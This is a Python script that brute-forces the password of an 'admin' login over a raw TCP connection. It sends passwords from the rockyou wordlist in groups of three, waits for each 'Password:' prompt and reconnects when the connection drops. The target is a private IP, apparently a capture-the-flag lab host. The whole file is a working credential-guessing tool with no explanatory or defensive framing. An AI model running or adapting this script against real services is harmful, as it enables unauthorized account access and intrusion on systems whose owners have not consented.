import socket
import time
import sys
from typing import Iterator, Tuple, Optional

# ===== Configuration =====
HOST = "10.10.251.91"                # change to target host
PORT = 8000                      # change to target port
WORDLIST = "/usr/share/wordlists/rockyou.txt"  # path to wordlist (change if needed)
USER = "admin"                    # user to send repeatedly
RECV_CHUNK = 4096
PROMPT_MARKER = b"Password:"      # marker to look for (bytes)
PROMPT_TIMEOUT = 6.0              # seconds to wait for the "Password:" prompt
CONNECT_TIMEOUT = 5.0
RECONNECT_TRIES = 3               # how many times to attempt reconnect on connection failure
INTER_SEND_DELAY = 0.15          # small delay between sends to avoid flooding
# ============================

def triplet_generator(path: str) -> Iterator[Tuple[Optional[str], Optional[str], Optional[str]]]:
    """Yield triplets (w1, w2, w3) from the wordlist. Missing entries become None."""
    with open(path, "r", encoding="latin-1", errors="ignore") as f:
        buf = []
        for line in f:
            w = line.rstrip("\n\r")
            if not w:
                continue
            buf.append(w)
            if len(buf) == 3:
                yield (buf[0], buf[1], buf[2])
                buf = []
        if buf:
            while len(buf) < 3:
                buf.append(None)
            yield (buf[0], buf[1], buf[2])

def create_connection() -> socket.socket:
    """Create and return a connected socket with timeouts set."""
    s = socket.create_connection((HOST, PORT), timeout=CONNECT_TIMEOUT)
    s.settimeout(0.5)  # we'll use a controlled recv loop with overall timeout
    return s

def recv_until(sock: socket.socket, marker: bytes, overall_timeout: float) -> bytes:
    """Receive until marker appears or overall_timeout (seconds) elapses.
       Returns the bytes received (may be empty)."""
    end_time = time.time() + overall_timeout
    buf = b""
    while time.time() < end_time:
        try:
            chunk = sock.recv(RECV_CHUNK)
            if not chunk:
                # remote closed connection or returned empty chunk
                break
            buf += chunk
            if marker in buf:
                return buf
        except socket.timeout:
            continue
        except (ConnectionResetError, BrokenPipeError):
            break
    return buf

def safe_send(sock: socket.socket, data: bytes) -> bool:
    """Send all data, return True on success, False on failure."""
    try:
        sock.sendall(data)
        return True
    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        print(f"[!] send failed: {e}", file=sys.stderr)
        return False

def main():
    last_sent = None
    trip_iter = triplet_generator(WORDLIST)

    # initial connection
    sock = None
    for attempt in range(1, RECONNECT_TRIES + 1):
        try:
            sock = create_connection()
            print(f"[+] Connected to {HOST}:{PORT}")
            break
        except Exception as e:
            print(f"[!] Connection attempt {attempt} failed: {e}", file=sys.stderr)
            time.sleep(1)
    if sock is None:
        print("[!] Could not establish connection. Exiting.", file=sys.stderr)
        sys.exit(1)

    try:
        for p1, p2, p3 in trip_iter:
            # Start a cycle by sending USER, then three passwords in sequence (each followed by prompt)
            for attempt in range(1, RECONNECT_TRIES + 1):
                try:
                    # 1) Send username
                    payload = (USER + "\n").encode("utf-8")
                    if not safe_send(sock, payload):
                        raise OSError("send failed")
                    last_sent = payload.decode("utf-8", errors="replace").rstrip("\n")
                    time.sleep(INTER_SEND_DELAY)

                    # Wait for Password:
                    received = recv_until(sock, PROMPT_MARKER, PROMPT_TIMEOUT)
                    print(f"[<] Server response (looking for prompt): {received.decode('utf-8', errors='replace')!r}")
                    if PROMPT_MARKER not in received:
                        print("[*] No Password: prompt after sending user. Stopping.")
                        print("Last sent:", last_sent)
                        return

                    # helper to send one password and wait for next Password: prompt
                    def send_pw_and_wait(pw: Optional[str]) -> Tuple[bool, bytes]:
                        """Return (ok, received_bytes)
                           ok == True if:
                             - received contains PROMPT_MARKER (normal case), OR
                             - received is empty (b'')  -> treated as "continue" only after 3rd pw
                           ok == False if received non-empty and doesn't include PROMPT_MARKER.
                        """
                        nonlocal last_sent, sock
                        if pw is None:
                            print("[*] Password slot is empty (end of list). Stopping.")
                            return (False, b'')
                        payload = (pw + "\n").encode("utf-8")
                        if not safe_send(sock, payload):
                            raise OSError("send failed")
                        last_sent = pw
                        print(f"[>] Sent password: {pw!r}")
                        time.sleep(INTER_SEND_DELAY)
                        received2 = recv_until(sock, PROMPT_MARKER, PROMPT_TIMEOUT)
                        print(f"[<] Server response after pw: {received2.decode('utf-8', errors='replace')!r}")
                        if received2 == b'':
                            # empty response — caller will decide whether this is acceptable
                            return (True, received2)
                        if PROMPT_MARKER in received2:
                            return (True, received2)
                        # non-empty and no prompt -> indicate failure
                        return (False, received2)

                    # Send p1
                    ok, _ = send_pw_and_wait(p1)
                    if not ok:
                        print("[*] Stopping after first password (no prompt).")
                        print("Last sent:", last_sent)
                        return

                    # Send p2
                    ok, _ = send_pw_and_wait(p2)
                    if not ok:
                        print("[*] Stopping after second password (no prompt).")
                        print("Last sent:", last_sent)
                        return

                    # Send p3
                    ok, received_after_p3 = send_pw_and_wait(p3)
                    if not ok:
                        print("[*] Stopping after third password (no prompt).")
                        print("Last sent:", last_sent)
                        return

                    # New behavior:
                    # If received_after_p3 is empty (b''), we treat this as "start next cycle immediately"
                    if received_after_p3 == b'':
                        print("[*] Server returned empty response after third password — starting next cycle (send admin again).")
                        # don't attempt to read extra; proceed to next triplet (outer loop will send admin)
                        break

                    # If received_after_p3 contains PROMPT_MARKER, it's the normal flow: proceed to next triplet
                    # (we already printed the response)
                    # read any small extra output non-blocking
                    try:
                        sock.settimeout(0.25)
                        extra = sock.recv(RECV_CHUNK)
                        if extra:
                            print(f"[<] Extra after p3: {extra.decode('utf-8', errors='replace')!r}")
                    except socket.timeout:
                        pass
                    finally:
                        sock.settimeout(0.5)

                    break  # success for this triplet, break reconnect attempts loop

                except (OSError, socket.timeout, ConnectionResetError) as e:
                    print(f"[!] Socket error during triplet (attempt {attempt}): {e}", file=sys.stderr)
                    try:
                        sock.close()
                    except Exception:
                        pass
                    sock = None
                    time.sleep(1)
                    # try reconnect and retry the same triplet
                    try:
                        sock = create_connection()
                        print(f"[+] Reconnected to {HOST}:{PORT}")
                        continue
                    except Exception as e2:
                        print(f"[!] Reconnect attempt failed: {e2}", file=sys.stderr)
                        time.sleep(1)
                        continue
            else:
                # exhausted reconnect tries for this triplet
                print("[!] Exhausted reconnect attempts for this triplet. Exiting.")
                return

        print("[+] Done iterating wordlist (or stopped).")
        if last_sent is not None:
            print("Last sent message:", repr(last_sent))
        else:
            print("No message was sent.")
    finally:
        try:
            sock.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()
